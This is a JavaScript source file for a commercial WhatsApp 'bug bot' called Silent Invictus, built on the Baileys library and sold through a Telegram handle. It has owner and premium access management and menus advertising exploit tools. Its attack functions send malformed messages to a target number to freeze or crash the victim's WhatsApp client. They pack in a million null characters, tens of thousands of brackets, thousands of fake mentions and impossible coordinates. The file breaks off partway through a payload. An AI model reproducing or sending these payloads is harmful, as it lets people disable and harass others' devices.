require('./config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage.js')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')

module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await client.decodeJid(client.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!client.public) {
if (!isCreator) return
}

if (command) {
  if (m.isGroup) {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}
//=================================================//
// Function Main — Menu
//=================================================//

const imageList = [
    fs.readFileSync("Media/Silent.jpg")
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

const menuImages = [
    fs.readFileSync("Media/Silent.jpg")
];
const selectedImage = menuImages[Math.floor(Math.random() * menuImages.length)];

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: null,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `—!s\`Silent (V1) 🎭\nBUYER ONLY`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
};

const ReplyButton = async (teks) => {
  const buttons = [{ buttonId: '.menu', buttonText: { displayText: 'Menu' } }];
  const buttonMessage = {
    image: RandomMenu,
    caption: teks,
    footer: 'DimzXSilent - Botz',
    buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363422697348548@newsletter",
        serverMessageId: null,
        newsletterName: `DimzXSilent`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net']
    },
    viewOnce: true
  };
  await client.sendMessage(m.chat, buttonMessage, { quoted: lol });
};



const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
//=================================================//
// Menu
//=================================================//

switch(command) {
case 'start':
case 'help':
case 'menu': {
await client.sendMessage(m.chat, {
    image: fs.readFileSync('./Media/Silent.jpg'),
    caption: `*- 計さ INFORMATION SILENT*
 ⌬ Botname : Silent Invictus
 ⌬ Version : 4.0
 ⌬ BuyScript : t.me/DimzNotDev
 ⌬ Status: ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
 ⌬ Runtime: ${runtime(process.uptime())}
`,
    footer: "DimzXSilent - Botz",
    contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: global.namaSaluran,
            serverId: 200
        }
    },
    buttons: [
        {
            buttonId: 'action',
            buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                    sections: [
                        {
                            title: '𝗦𝗲𝗹𝗹𝗲𝗰𝘁 𝗠𝗲𝗻𝘂',
                            rows: [
                                { "title": "Bug Menu 💣", "id": ".bugmenu", "description": "Daftar menu bug & exploit tools." },
                                { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Fitur khusus Owner Bot." },
                                { "title": "Help ❓", "id": ".help", "description": "Panduan menggunakan semua fitur bot." }
                            ]
                        }
                    ]
                })
            }
        }
    ],
    headerType: 4,
    viewOnce: true,
}, { quoted: lol });

await sleep(2000)
client.sendMessage(m.chat, {
  audio: fs.readFileSync('./Media/sound.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: m })
}
break;

case 'xbug':
case 'bugmenu': {
await client.sendMessage(m.chat, {
    image: fs.readFileSync('./Media/Silent.jpg'),
    caption: `*- 計さ INFORMATION SILENT*
 ⌬ Botname : Silent Invictus
 ⌬ Version : 4.0
 ⌬ BuyScript : t.me/DimzNotDev
 ⌬ Status: ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
 ⌬ Runtime: ${runtime(process.uptime())}

*- 計さ COMMAND BUGS*
 ▢ .silent-blank
 ▢ .silent-combo
 ▢ .silent-invis`,
    footer: "DimzXSilent - Botz",
    contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: global.namaSaluran,
            serverId: 200
        }
    },
    buttons: [
        {
            buttonId: 'action',
            buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                    sections: [
                        {
                            title: '𝗦𝗲𝗹𝗹𝗲𝗰𝘁 𝗠𝗲𝗻𝘂',
                            rows: [
                                { "title": "SILENT-BLANK💀", "id": ".silent-blank", "description": "Bug UIX Blank mode kosong." },
                                { "title": "SILENT-COMBO ⚡", "id": ".silent-combo", "description": "Gabungan bug aktif terbaru." },
                                { "title": "SILENT-INVKS💣", "id": ".silent-invis", "description": "Bug delay keras untuk sistem target." },
                                { "title": "Main Menu 🏠", "id": ".menu", "description": "Kembali ke menu utama bot." }
                            ]
                        }
                    ]
                })
            }
        }
    ],
    headerType: 4,
    viewOnce: true,
}, { quoted: lol });

await sleep(2000)
client.sendMessage(m.chat, {
  audio: fs.readFileSync('./Media/sound.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: m })
}
break;
case 'xowner':
case 'ownermenu': {
await client.sendMessage(m.chat, {
    image: fs.readFileSync('./Media/Silent.jpg'),
    caption: `*- 計さ INFORMATION SILENT*
 ⌬ Botname : Silent Invictus
 ⌬ Version : 4.0
 ⌬ BuyScript : t.me/DimzNotDev
 ⌬ Status: ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
 ⌬ Runtime: ${runtime(process.uptime())}

*- 計さ COMMAND BUGS*
 ▢ .addowner - .delowner
 ▢ .addprem - .delprem
 ▢ .listowner - .listprem`,
    footer: "DimzXSilent - Botz",
    contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.idSaluran,
            newsletterName: global.namaSaluran,
            serverId: 200
        }
    },
    buttons: [
        {
            buttonId: 'action',
            buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                    sections: [
                        {
                            title: '𝗦𝗲𝗹𝗹𝗲𝗰𝘁 𝗠𝗲𝗻𝘂',
                            rows: [
                                { "title": "Addowner", "id": ".addowner", "description": "Silent." },
                                { "title": "Addprem", "id": ".addprem", "description": " Silent." },
                                { "title": "Listprem", "id": ".listprem", "description": "Silent."},

                                { "title": "Main Menu 🏠", "id": ".menu", "description": "Kembali ke menu utama bot." }
                            ]
                        }
                    ]
                })
            }
        }
    ],
    headerType: 4,
    viewOnce: true,
}, { quoted: lol });

await sleep(2000)
client.sendMessage(m.chat, {
  audio: fs.readFileSync('./Media/sound.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: m })
}
break;
//=================================================//
// Function Owner
//=================================================//

case 'addowner':
case 'addown': {
    if (!isCreator) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!owner.includes(number)) owner.push(number);
    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delowner':
case 'delown': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`❌ Owner *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'addpremium':
case 'addprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Nomor tidak valid!");

    if (!Premium.includes(number)) Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`✅ *@${number}* berhasil jadi user premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delpremium':
case 'delprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Premium.indexOf(number);
    if (index !== -1) {
        Premium.splice(index, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        ReplyButton(`❌ *@${number}* telah dihapus dari daftar premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyButton(`⚠️ *@${number}* tidak terdaftar sebagai premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'listpremium':
case 'listprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (Premium.length === 0) return ReplyButton("❌ Tidak ada user premium.");
    
    let textList = `*📜 Daftar User Premium:*\n\n`;
    for (let i = 0; i < Premium.length; i++) {
        textList += `${i + 1}. wa.me/${Premium[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'listowner':
case 'listown': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (owner.length === 0) return ReplyButton("❌ Tidak ada data Owner.");

    let textList = `*👑 Daftar Owner Bot:*\n\n`;
    for (let i = 0; i < owner.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;

case 'public': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = true;
    ReplyButton("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = false;
    ReplyButton("Bot set to private mode.");
}
break;

//=================================================//
// Function Bug
//=================================================//
async function SilentDelayHard(client, target) {
console.log(chalk.red(`Silent Success Send Attack To ${target}`))
var xts = { url: "https://img1.pixhost.to/images/10157/660814845_alwayszakzz.jpg" }
  await client.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ", // FuncBug
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 555,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: false,
              title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              body: "https://rule34.com",
              previewType: "VIDEO",
              mediaType: "VIDEO",
              thumbnail: xts,
              sourceUrl: "t.me/DimzNotDev",
              mediaUrl: "t.me/DimzNotDev",
              sourceType: " x ",
              sourceId: " x ",
              containsAutoReply: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: xts,
              caption: " X ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X ",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X ",
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function SilentUixBlank(target) {
console.log(chalk.red(`Silent Success Send Attack To ${target}`))
const DevaOmagah = "ꦽ".repeat(5000);
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            hasMediaAttachment: false
          },
          body: {
            text: "\n".repeat(10) + DevaOmagah
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(2000) + "[".repeat(1234),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: DevaOmagah
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: DevaOmagah
              }
            ]
          }
        }
      }
    }
  };

    await client.relayMessage(target, msg, {
   messageId: null,
    participant: { jid: target }
  });
}

async function SilentCombobug(client, target) {
  try {
    let message1 = {
      ephemeralMessage: {
        message: {
          header: {
            title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 922.999999999999,
              name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
            }
          },
          body: {
            text: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(50000)
          },
          contextInfo: {
            participant: target,
            mentionedJid: ["0@s.whatsapp.net"],
            externalAdReply: {
              title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              body: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              mediaType: 1,
              thumbnailUrl: null,
              sourceUrl: "t.me/DimzNotDev",
              renderLargerThumbnail: true
            },
            forwardingScore: 999999,
            isForwarded: true
          },
          locationMessage: {
            degreesLatitude: 999999999999,
            degreesLongitude: 9999999999,
            name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
          },
          externalAdReply: {
            title: "INVALID DUPLICATE",
            body: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            sourceUrl: "t.me/DimzNotDev",
          },
          forwardingScore: 12345,
          isForwarded: true,
          viewOnceMessageV2: {
            message: {
              viewOnceMessageV2: {
                message: {
                  nativeFlowMessage: {
                    messageParamsJson: "[".repeat(100000)
                  },
                  externalAdReply: {
                    title: "NESTED EXTREME",
                    body: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
                    sourceUrl: "t.me/justinoffc"
                  },
                  forwardingScore: 999999999,
                  isForwarded: true,
                  locationMessage: {
                    degreesLatitude: 9999999,
                    degreesLongitude: 9999999,
                    name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
                    address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
                  }
                }
              }
            }
          }
        }
      }
    }

    await client.relayMessage(target, message1, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    })
    console.log(chalk.red(`Silent Success Send Attack To ${target}`))

    let message2 = {
      ephemeralMessage: {
        message: {
          header: {
            title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 922.999999999999,
              name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
            }
          },
          body: {
            text: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(25000)
          },
          contextInfo: {
            participant: target,
            mentionedJid: ["0@s.whatsapp.net"],
            externalAdReply: {
              title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              body: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              mediaType: 1,
              thumbnailUrl: "https://telegra.ph/file/2a2e5f19f9b7a89.jpg",
              sourceUrl: "https://Wa.me/stickerpack/justinoffc",
              renderLargerThumbnail: true
            },
            forwardingScore: 999999,
            isForwarded: true
          },
          locationMessage: {
            degreesLatitude: 123456789,
            degreesLongitude: 987654321,
            name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
          },
          externalAdReply: {
            title: "INVALID DUPLICATE",
            body: "",
            sourceUrl: "t.me/DimzNotDev"
          },
          forwardingScore: 12345,
          isForwarded: true
        }
      }
    }

    await client.relayMessage(target, message2, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    })
    console.log(chalk.red(`Silent Success Send Attack To ${target}`))

    let message3 = {
      ephemeralMessage: {
        message: {
          header: {
            title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 922.999999999999,
              name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
            }
          },
          body: {
            text: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(25000)
          },
          contextInfo: {
            participant: target,
            mentionedJid: ["0@s.whatsapp.net"],
            externalAdReply: {
              title: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
